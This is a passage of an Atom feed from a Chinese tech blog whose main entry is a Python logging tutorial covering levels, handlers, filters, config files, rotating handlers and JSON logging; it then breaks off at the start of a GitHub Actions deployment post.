      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>10. æ—¥å¿—è®°å½• â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-137/"/>
    <id>https://qiwihui.com/qiwihui-blog-137/</id>
    <published>2022-08-13T01:54:25.650Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>Pythonä¸­çš„æ—¥å¿—è®°å½•æ¨¡å—æ˜¯åŠŸèƒ½å¼ºå¤§çš„å†…ç½®æ¨¡å—ï¼Œå› æ­¤ä½ å¯ä»¥å¿«é€Ÿå°†æ—¥å¿—è®°å½•æ·»åŠ åˆ°åº”ç”¨ç¨‹åºä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br></pre></td></tr></table></figure><span id="more"></span><h2><span id="ri-zhi-ji-bie">æ—¥å¿—çº§åˆ«</span></h2><p>æœ‰5ç§ä¸åŒçš„æ—¥å¿—çº§åˆ«æŒ‡ç¤ºäº‹ä»¶çš„ä¸¥é‡ç¨‹åº¦ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œç³»ç»Ÿä»…è®°å½• <em>è­¦å‘Š(WARNING)</em> çº§åˆ«åŠæ›´é«˜çº§åˆ«çš„äº‹ä»¶ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.debug(<span class="string">&#x27;This is a debug message&#x27;</span>)</span><br><span class="line">logging.info(<span class="string">&#x27;This is an info message&#x27;</span>)</span><br><span class="line">logging.warning(<span class="string">&#x27;This is a warning message&#x27;</span>)</span><br><span class="line">logging.error(<span class="string">&#x27;This is an error message&#x27;</span>)</span><br><span class="line">logging.critical(<span class="string">&#x27;This is a critical message&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">WARNING:root:This <span class="keyword">is</span> a warning message</span><br><span class="line">ERROR:root:This <span class="keyword">is</span> an error message</span><br><span class="line">CRITICAL:root:This <span class="keyword">is</span> a critical message</span><br></pre></td></tr></table></figure><h2><span id="pei-zhi">é…ç½®</span></h2><p>ä½¿ç”¨ <code>basicConfig(**kwargs)</code>ï¼Œä½ å¯ä»¥è‡ªå®šä¹‰æ ¹è®°å½•å™¨ã€‚ æœ€å¸¸è§çš„å‚æ•°æ˜¯ <code>level</code>ï¼Œ <code>format</code> å’Œ <code>filename</code>ã€‚æŸ¥çœ‹å…¨éƒ¨å¯èƒ½çš„å‚æ•°ï¼š<a href="https://docs.python.org/3/library/logging.html#logging.basicConfig">https://docs.python.org/3/library/logging.html#logging.basicConfig</a>ã€‚æŸ¥çœ‹å¯èƒ½çš„ format ï¼š<a href="https://docs.python.org/3/library/logging.html#logrecord-attributes">https://docs.python.org/3/library/logging.html#logrecord-attributes</a>ã€‚æŸ¥çœ‹å¦‚ä½•è®¾ç½®æ—¶é—´å­—ç¬¦ä¸²ï¼š<a href="https://docs.python.org/3/library/time.html#time.strftime">https://docs.python.org/3/library/time.html#time.strftime</a>ã€‚è¯·æ³¨æ„ï¼Œæ­¤å‡½æ•°ä»…åº”è°ƒç”¨ä¸€æ¬¡ï¼Œé€šå¸¸åœ¨å¯¼å…¥æ¨¡å—åé¦–å…ˆè°ƒç”¨ã€‚ å¦‚æœæ ¹è®°å½•å™¨å·²ç»é…ç½®äº†å¤„ç†ç¨‹åºï¼Œåˆ™è¯¥è®¾ç½®æ— æ•ˆã€‚ ä¾‹å¦‚ï¼Œåœ¨ <code>basicConfig</code> ä¹‹å‰è°ƒç”¨ <code>logging.info(...)</code> å°†æå‰è®¾ç½®å¤„ç†ç¨‹åºã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>, datefmt=<span class="string">&#x27;%m/%d/%Y %H:%M:%S&#x27;</span>)</span><br><span class="line"><span class="comment"># ç°åœ¨ï¼Œè°ƒè¯•æ¶ˆæ¯ä¹Ÿå°†ä»¥å…¶ä»–æ ¼å¼è®°å½•ã€‚</span></span><br><span class="line">logging.debug(<span class="string">&#x27;Debug message&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™å°†è®°å½•åˆ°æ–‡ä»¶è€Œä¸æ˜¯æ§åˆ¶å°ã€‚</span></span><br><span class="line"><span class="comment"># logging.basicConfig(level=logging.DEBUG, filename=&#x27;app.log&#x27;)</span></span><br></pre></td></tr></table></figure><h2><span id="mo-kuai-nei-ji-lu-he-ji-lu-qi-ceng-ci-jie-gou">æ¨¡å—å†…è®°å½•å’Œè®°å½•å™¨å±‚æ¬¡ç»“æ„</span></h2><p>åœ¨å…·æœ‰å¤šä¸ªæ¨¡å—çš„åº”ç”¨ç¨‹åºä¸­ï¼Œæœ€ä½³å®è·µæ˜¯ä½¿ç”¨ <code>__name__</code> å…¨å±€å˜é‡åˆ›å»ºå†…éƒ¨è®°å½•å™¨ã€‚ è¿™å°†ä½¿ç”¨ä½ çš„æ¨¡å—åç§°åˆ›å»ºä¸€ä¸ªè®°å½•å™¨ï¼Œå¹¶ç¡®ä¿æ²¡æœ‰åç§°å†²çªã€‚ æ—¥å¿—è®°å½•æ¨¡å—åˆ›å»ºè®°å½•å™¨çš„å±‚æ¬¡ç»“æ„ï¼Œä»æ ¹è®°å½•å™¨å¼€å§‹ï¼Œç„¶åå°†æ–°çš„è®°å½•å™¨æ·»åŠ åˆ°è¯¥å±‚æ¬¡ç»“æ„ä¸­ã€‚ å¦‚æœéšåå°†æ¨¡å—å¯¼å…¥å¦ä¸€ä¸ªæ¨¡å—ï¼Œåˆ™å¯ä»¥é€šè¿‡è®°å½•å™¨åç§°å°†æ—¥å¿—æ¶ˆæ¯ä¸æ­£ç¡®çš„æ¨¡å—å…³è”ã€‚ è¯·æ³¨æ„ï¼Œæ›´æ”¹æ ¹è®°å½•å™¨çš„ <code>basicConfig</code> è¿˜å°†å½±å“å±‚æ¬¡ç»“æ„ä¸­å…¶ä»–ï¼ˆä¸‹éƒ¨ï¼‰è®°å½•å™¨çš„æ—¥å¿—äº‹ä»¶ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># helper.py</span></span><br><span class="line"><span class="comment"># -------------------------------------</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line">logger.info(<span class="string">&#x27;HELLO&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main.py</span></span><br><span class="line"><span class="comment"># -------------------------------------</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> helper</span><br><span class="line"></span><br><span class="line"><span class="comment"># --&gt; å½“è¿è¡Œ main.py æ—¶çš„è¾“å‡º</span></span><br><span class="line"><span class="comment"># helper - INFO - HELLO</span></span><br></pre></td></tr></table></figure><h2><span id="chuan-bo">ä¼ æ’­</span></h2><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œé™¤äº†é™„åŠ åˆ°åˆ›å»ºçš„è®°å½•å™¨çš„ä»»ä½•å¤„ç†ç¨‹åºå¤–ï¼Œæ‰€æœ‰åˆ›å»ºçš„è®°å½•å™¨è¿˜å°†æ—¥å¿—äº‹ä»¶ä¼ é€’ç»™é«˜çº§è®°å½•å™¨çš„å¤„ç†ç¨‹åºã€‚ ä½ å¯ä»¥é€šè¿‡è®¾ç½® <code>propagate = False</code> æ¥ç¦ç”¨æ­¤åŠŸèƒ½ã€‚ æœ‰æ—¶ï¼Œå½“ä½ æƒ³çŸ¥é“ä¸ºä»€ä¹ˆçœ‹ä¸åˆ°æ¥è‡ªå¦ä¸€ä¸ªæ¨¡å—çš„æ—¥å¿—æ¶ˆæ¯æ—¶ï¼Œåˆ™å¯èƒ½æ˜¯æ­¤å±æ€§ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -------------------------------------</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line">logger.propagate = <span class="literal">False</span></span><br><span class="line">logger.info(<span class="string">&#x27;HELLO&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main.py</span></span><br><span class="line"><span class="comment"># -------------------------------------</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> helper</span><br><span class="line"></span><br><span class="line"><span class="comment"># --&gt; è¿è¡Œmain.pyæ—¶æ— è¾“å‡ºï¼Œå› ä¸º helper æ¨¡å—è®°å½•å™¨ä¸ä¼šå°†å…¶æ¶ˆæ¯ä¼ æ’­åˆ°æ ¹è®°å½•å™¨</span></span><br></pre></td></tr></table></figure><h2><span id="ri-zhi-chu-li-cheng-xu">æ—¥å¿—å¤„ç†ç¨‹åº</span></h2><p>å¤„ç†ç¨‹åºå¯¹è±¡è´Ÿè´£å°†é€‚å½“çš„æ—¥å¿—æ¶ˆæ¯è°ƒåº¦åˆ°å¤„ç†ç¨‹åºçš„ç‰¹å®šç›®æ ‡ã€‚ ä¾‹å¦‚ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸åŒçš„å¤„ç†ç¨‹åºé€šè¿‡HTTPæˆ–é€šè¿‡ç”µå­é‚®ä»¶å°†æ¶ˆæ¯å‘é€åˆ°æ ‡å‡†è¾“å‡ºæµï¼Œæ–‡ä»¶ã€‚ é€šå¸¸ï¼Œä½ ä¸ºæ¯ä¸ªå¤„ç†ç¨‹åºé…ç½®ä¸€ä¸ªçº§åˆ«ï¼ˆ <code>setLevel()</code> ï¼‰ï¼Œä¸€ä¸ªæ ¼å¼åŒ–ç¨‹åºï¼ˆ <code>setFormatter()</code>ï¼‰å’Œä¸€ä¸ªå¯é€‰çš„è¿‡æ»¤å™¨ï¼ˆ <code>addFilter()</code> ï¼‰ã€‚ æœ‰å…³å¯èƒ½çš„å†…ç½®å¤„ç†ç¨‹åºï¼Œè¯·å‚è§ <a href="https://docs.python.org/3/howto/logging.html#useful-handlers">https://docs.python.org/3/howto/logging.html#useful-handlers</a>ã€‚ å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥é€šè¿‡æ´¾ç”Ÿè¿™äº›ç±»æ¥å®ç°è‡ªå·±çš„å¤„ç†ç¨‹åºã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå¤„ç†å™¨</span></span><br><span class="line">stream_handler = logging.StreamHandler()</span><br><span class="line">file_handler = logging.FileHandler(<span class="string">&#x27;file.log&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®çº§åˆ«å’Œæ ¼å¼åŒ–ç¨‹åºï¼Œå¹¶æ·»åŠ åˆ°å¤„ç†å™¨ä¸Š</span></span><br><span class="line">stream_handler.setLevel(logging.WARNING) <span class="comment"># è­¦å‘ŠåŠä»¥ä¸Šçº§åˆ«æ—¥å¿—è®°å½•åˆ°æµä¸­</span></span><br><span class="line">file_handler.setLevel(logging.ERROR) <span class="comment"># é”™è¯¯åŠä»¥ä¸Šçº§åˆ«è®°å½•åˆ°æ–‡ä»¶ä¸­</span></span><br><span class="line"></span><br><span class="line">stream_format = logging.Formatter(<span class="string">&#x27;%(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">file_format = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">stream_handler.setFormatter(stream_format)</span><br><span class="line">file_handler.setFormatter(file_format)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ å¤„ç†å™¨åˆ°æ—¥å¿—è®°å½•å™¨ä¸Š</span></span><br><span class="line">logger.addHandler(stream_handler)</span><br><span class="line">logger.addHandler(file_handler)</span><br><span class="line"></span><br><span class="line">logger.warning(<span class="string">&#x27;This is a warning&#x27;</span>) <span class="comment"># è®°å½•åˆ°æµä¸­</span></span><br><span class="line">logger.error(<span class="string">&#x27;This is an error&#x27;</span>) <span class="comment"># è®°å½•åˆ°æµå’Œæ–‡ä»¶ä¸­</span></span><br></pre></td></tr></table></figure><h3><span id="guo-lu-qi-li-zi">è¿‡æ»¤å™¨ä¾‹å­</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">InfoFilter</span>(logging.Filter):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è¦†ç›–æ­¤æ–¹æ³•ã€‚ ä»…æ­¤æ–¹è¯„ä¼°ä¸ºTrueçš„æ—¥å¿—è®°å½•å°†é€šè¿‡è¿‡æ»¤å™¨ã€‚</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">self, record</span>):</span><br><span class="line">        <span class="keyword">return</span> record.levelno == logging.INFO</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨åªæœ‰ INFO çº§åˆ«çš„æ¶ˆæ¯ä¼šè¢«è®°å½•ã€‚</span></span><br><span class="line">stream_handler.addFilter(InfoFilter())</span><br><span class="line">logger.addHandler(stream_handler)</span><br></pre></td></tr></table></figure><h2><span id="qi-ta-pei-zhi-fang-fa">å…¶ä»–é…ç½®æ–¹æ³•</span></h2><p>æˆ‘ä»¬å·²ç»çœ‹åˆ°äº†å¦‚ä½•é…ç½®æ—¥å¿—ï¼Œä»è€Œåœ¨ä»£ç ä¸­æ˜¾å¼åœ°åˆ›å»ºæ—¥å¿—è®°å½•å™¨ï¼Œå¤„ç†ç¨‹åºå’Œæ ¼å¼åŒ–ç¨‹åºã€‚ è¿˜æœ‰å…¶ä»–ä¸¤ç§é…ç½®æ–¹æ³•ï¼š</p><ul><li>åˆ›å»ºæ—¥å¿—è®°å½•é…ç½®æ–‡ä»¶å¹¶ä½¿ç”¨ <code>fileConfig()</code> å‡½æ•°è¯»å–å®ƒã€‚ è¯·å‚è§ä¸‹é¢çš„ç¤ºä¾‹ã€‚</li><li>åˆ›å»ºé…ç½®ä¿¡æ¯å­—å…¸å¹¶å°†å…¶ä¼ é€’ç»™ <code>dictConfig()</code> å‡½æ•°ã€‚ æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§<a href="https://docs.python.org/3/library/logging.config.html#logging.config.dictConfig">https://docs.python.org/3/library/logging.config.html#logging.config.dictConfig</a>ã€‚</li></ul><h3><span id="conf-wen-jian">.confæ–‡ä»¶</span></h3><p>åˆ›å»ºä¸€ä¸ª <em>.conf</em>ï¼ˆæˆ–æœ‰æ—¶å­˜å‚¨ä¸º <em>.ini</em>ï¼‰æ–‡ä»¶ï¼Œå®šä¹‰è®°å½•å™¨ï¼Œå¤„ç†ç¨‹åºå’Œæ ¼å¼åŒ–ç¨‹åºï¼Œå¹¶æä¾›åç§°ä½œä¸ºé”®ã€‚ å®šä¹‰å…¶åç§°åï¼Œå¯ä»¥é€šè¿‡åœ¨å…¶åç§°ä¹‹é—´ç”¨ä¸‹åˆ’çº¿åˆ†éš”ä¹‹å‰æ·»åŠ å•è¯ <em>logger</em>ï¼Œ <em>handler</em> å’Œ <em>formatter</em> è¿›è¡Œé…ç½®ã€‚ ç„¶åï¼Œä½ å¯ä»¥ä¸ºæ¯ä¸ªè®°å½•å™¨ï¼Œå¤„ç†ç¨‹åºå’Œæ ¼å¼åŒ–ç¨‹åºè®¾ç½®å±æ€§ã€‚ åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œå°†ä½¿ç”¨ StreamHandler é…ç½®æ ¹è®°å½•å™¨å’Œåä¸º <em>simpleExample</em> çš„è®°å½•å™¨ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># logging.conf</span></span><br><span class="line">[loggers]</span><br><span class="line">keys=root,simpleExample</span><br><span class="line"></span><br><span class="line">[handlers]</span><br><span class="line">keys=consoleHandler</span><br><span class="line"></span><br><span class="line">[formatters]</span><br><span class="line">keys=simpleFormatter</span><br><span class="line"></span><br><span class="line">[logger_root]</span><br><span class="line">level=DEBUG</span><br><span class="line">handlers=consoleHandler</span><br><span class="line"></span><br><span class="line">[logger_simpleExample]</span><br><span class="line">level=DEBUG</span><br><span class="line">handlers=consoleHandler</span><br><span class="line">qualname=simpleExample</span><br><span class="line">propagate=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">[handler_consoleHandler]</span><br><span class="line"><span class="keyword">class</span>=StreamHandler</span><br><span class="line">level=DEBUG</span><br><span class="line">formatter=simpleFormatter</span><br><span class="line">args=(sys.stdout,)</span><br><span class="line"></span><br><span class="line">[formatter_simpleFormatter]</span><br><span class="line"><span class="built_in">format</span>=%(asctime)s - %(name)s - %(levelname)s - %(message)s</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åœ¨ä»£ç ä¸­ä½¿ç”¨é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.config</span><br><span class="line"></span><br><span class="line">logging.config.fileConfig(<span class="string">&#x27;logging.conf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨é…ç½®æ–‡ä»¶ä¸­çš„åç§°åˆ›å»ºè®°å½•å™¨ã€‚</span></span><br><span class="line"><span class="comment"># è¯¥è®°å½•å™¨ç°åœ¨å…·æœ‰å¸¦æœ‰ DEBUG çº§åˆ«å’ŒæŒ‡å®šæ ¼å¼çš„ StreamHandler</span></span><br><span class="line">logger = logging.getLogger(<span class="string">&#x27;simpleExample&#x27;</span>)</span><br><span class="line"></span><br><span class="line">logger.debug(<span class="string">&#x27;debug message&#x27;</span>)</span><br><span class="line">logger.info(<span class="string">&#x27;info message&#x27;</span>)</span><br></pre></td></tr></table></figure><h2><span id="bu-huo-dui-zhan-gen-zong">æ•è·å †æ ˆè·Ÿè¸ª</span></h2><p>å°†è·Ÿè¸ªè®°å½•è®°å½•åœ¨å¼‚å¸¸æ—¥å¿—ä¸­å¯¹äºè§£å†³é—®é¢˜éå¸¸æœ‰ç”¨ã€‚ ä½ å¯ä»¥é€šè¿‡å°† <em>excinfo</em> å‚æ•°è®¾ç½®ä¸ºTrueæ¥æ•è· <code>logging.error()</code> ä¸­çš„å›æº¯ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    value = a[<span class="number">3</span>]</span><br><span class="line"><span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">    logging.error(e)</span><br><span class="line">    logging.error(e, exc_info=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ERROR:root:<span class="built_in">list</span> index out of <span class="built_in">range</span></span><br><span class="line">ERROR:root:<span class="built_in">list</span> index out of <span class="built_in">range</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;ipython-input-6-df97a133cbe6&gt;&quot;</span>, line <span class="number">5</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    value = a[<span class="number">3</span>]</span><br><span class="line">IndexError: <span class="built_in">list</span> index out of <span class="built_in">range</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæœªæ•è·æ­£ç¡®çš„ Exceptionï¼Œåˆ™è¿˜å¯ä»¥ä½¿ç”¨ <em>traceback.formatexc()</em> æ–¹æ³•è®°å½•è¯¥å¼‚å¸¸ã€‚</p><h2><span id="gun-dong-filehandler">æ»šåŠ¨ FileHandler</span></h2><p>å½“ä½ æœ‰ä¸€ä¸ªå¤§å‹åº”ç”¨ç¨‹åºå°†è®¸å¤šäº‹ä»¶è®°å½•åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè€Œä½ åªéœ€è¦è·Ÿè¸ªæœ€è¿‘çš„äº‹ä»¶æ—¶ï¼Œè¯·ä½¿ç”¨RotatingFileHandleræ¥ä½¿æ–‡ä»¶ä¿æŒè¾ƒå°ã€‚ å½“æ—¥å¿—è¾¾åˆ°ä¸€å®šæ•°é‡çš„å­—èŠ‚æ—¶ï¼Œå®ƒå°†è¢«â€œæ»šåŠ¨â€ã€‚ ä½ è¿˜å¯ä»¥ä¿ç•™å¤šä¸ªå¤‡ä»½æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åå†è¦†ç›–å®ƒä»¬ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> logging.handlers <span class="keyword">import</span> RotatingFileHandler</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line">logger.setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2KBåæ»šåŠ¨ï¼Œå¹¶ä¿ç•™å¤‡ä»½æ—¥å¿—ä¸º app.log.1, app.log.2 ç­‰.</span></span><br><span class="line">handler = RotatingFileHandler(<span class="string">&#x27;app.log&#x27;</span>, maxBytes=<span class="number">2000</span>, backupCount=<span class="number">5</span>)</span><br><span class="line">logger.addHandler(handler)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    logger.info(<span class="string">&#x27;Hello, world!&#x27;</span>)</span><br></pre></td></tr></table></figure><h2><span id="timedrotatingfilehandler">TimedRotatingFileHandler</span></h2><p>å¦‚æœä½ çš„åº”ç”¨ç¨‹åºå°†é•¿æ—¶é—´è¿è¡Œï¼Œåˆ™å¯ä»¥ä½¿ç”¨ TimedRotatingFileHandlerã€‚ è¿™å°†æ ¹æ®ç»è¿‡çš„æ—¶é—´åˆ›å»ºä¸€ä¸ªè½®æ¢æ—¥å¿—ã€‚ <em>when</em> å‚æ•°çš„å¯èƒ½æ—¶é—´æ¡ä»¶æ˜¯ï¼š</p><ul><li>second (s)</li><li>minute (m)</li><li>hour (h)</li><li>day (d)</li><li>w0-w6 (å·¥ä½œæ—¥, 0=æ˜ŸæœŸä¸€)</li><li>midnight</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> logging.handlers <span class="keyword">import</span> TimedRotatingFileHandler</span><br><span class="line"> </span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line">logger.setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™å°†æ¯åˆ†é’Ÿåˆ›å»ºä¸€ä¸ªæ–°çš„æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶åœ¨è¦†ç›–æ—§æ—¥å¿—ä¹‹å‰åˆ›å»ºä¸€ä¸ªå¸¦æœ‰æ—¶é—´æˆ³çš„5ä¸ªå¤‡ä»½æ–‡ä»¶ã€‚</span></span><br><span class="line">handler = TimedRotatingFileHandler(<span class="string">&#x27;timed_test.log&#x27;</span>, when=<span class="string">&#x27;m&#x27;</span>, interval=<span class="number">1</span>, backupCount=<span class="number">5</span>)</span><br><span class="line">logger.addHandler(handler)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    logger.info(<span class="string">&#x27;Hello, world!&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">50</span>)</span><br></pre></td></tr></table></figure><h2><span id="yi-json-ge-shi-deng-lu">ä»¥JSONæ ¼å¼ç™»å½•</span></h2><p>å¦‚æœä½ çš„åº”ç”¨ç¨‹åºä»ä¸åŒçš„æ¨¡å—ï¼ˆç‰¹åˆ«æ˜¯åœ¨å¾®æœåŠ¡ä½“ç³»ç»“æ„ä¸­ï¼‰ç”Ÿæˆè®¸å¤šæ—¥å¿—ï¼Œé‚£ä¹ˆå®šä½é‡è¦çš„æ—¥å¿—ä»¥è¿›è¡Œåˆ†æå¯èƒ½ä¼šå¾ˆå›°éš¾ã€‚ å› æ­¤ï¼Œæœ€ä½³å®è·µæ˜¯ä»¥JSONæ ¼å¼è®°å½•ä½ çš„æ¶ˆæ¯ï¼Œå¹¶å°†å…¶å‘é€åˆ°é›†ä¸­å¼æ—¥å¿—ç®¡ç†ç³»ç»Ÿã€‚ ç„¶åï¼Œä½ å¯ä»¥è½»æ¾åœ°æœç´¢ï¼Œå¯è§†åŒ–å’Œåˆ†ææ—¥å¿—è®°å½•ã€‚</p><p>æˆ‘å»ºè®®ä½¿ç”¨æ­¤å¼€æºJSONè®°å½•å™¨ï¼š<a href="https://github.com/madzak/python-json-logger">https://github.com/madzak/python-json-logger</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install python-json-logger</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> pythonjsonlogger <span class="keyword">import</span> jsonlogger</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger()</span><br><span class="line"></span><br><span class="line">logHandler = logging.StreamHandler()</span><br><span class="line">formatter = jsonlogger.JsonFormatter()</span><br><span class="line">logHandler.setFormatter(formatter)</span><br><span class="line">logger.addHandler(logHandler)</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      10. æ—¥å¿—è®°å½• â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬9å¤©ï¼šéƒ¨ç½²åˆ°GitHub Packages</title>
    <link href="https://qiwihui.com/qiwihui-blog-92/"/>
    <id>https://qiwihui.com/qiwihui-blog-92/</id>
    <published>2022-08-13T01:54:25.650Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æœˆåˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»ç ”ç©¶äº†è®¸å¤šæ‰§è¡Œæ„å»ºå¹¶è¿è¡Œä¸€äº›æµ‹è¯•çš„æ–¹æ¡ˆã€‚è¿™äº›éƒ½æ˜¯å¾ˆæ£’çš„å·¥ä½œæµç¨‹â”€â”€å®ƒä»¬ç¡®ä¿è¿›å…¥ä½ çš„é¡¹ç›®çš„pull requestæ˜¯é«˜è´¨é‡çš„ï¼Œå¹¶ä¸”ä½ çš„ä¸»åˆ†æ”¯æ˜¯å¥åº·çš„ã€‚</p><p>ä½†æ˜¯ï¼Œä½ é€šå¸¸æƒ³é‡‡å–ä¸‹ä¸€æ­¥å¹¶éƒ¨ç½²è‡ªå·±æ„å»ºçš„å†…å®¹ã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½æƒ³æ„å»ºä¸€ä¸ªå®¹å™¨ï¼Œå¹¶åœ¨æ¯æ¬¡æ–°çš„ä¸»åˆ†æ”¯åˆå…¥æ–°åŠŸèƒ½æ—¶å°†å…¶ä¸Šä¼ åˆ°<a href="https://github.com/features/packages">GitHub Packages</a>ã€‚è¿™å°†ç¡®ä¿ä½ æœ‰ä¸€ä¸ªå¯ä»¥è¿è¡Œå¹¶éªŒè¯æ¯ä¸ªæ›´æ”¹çš„å®¹å™¨ã€‚</p><p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬è¦è§¦å‘å‘masterçš„æ¨é€ã€‚ï¼ˆæ— è®ºæ˜¯ä» <code>git push</code> è¿˜æ˜¯ä»åˆå¹¶pull requestï¼Œåªè¦<a href="https://www.edwardthomson.com/blog/github_actions_1_cicd_triggers.html">é›†æˆåˆ°master</a>ä¸­ï¼Œ<code>push</code> è§¦å‘å™¨éƒ½å°†è¿è¡Œã€‚ï¼‰</p><p>ç„¶åï¼Œæˆ‘ä»¬å°†ä»dockerç™»å½•åˆ°GitHub Packagesã€‚æˆ‘ä»¬å¯ä»¥ç®€å•åœ°ä½¿ç”¨GitHub Actionsæä¾›ç»™æˆ‘ä»¬çš„ 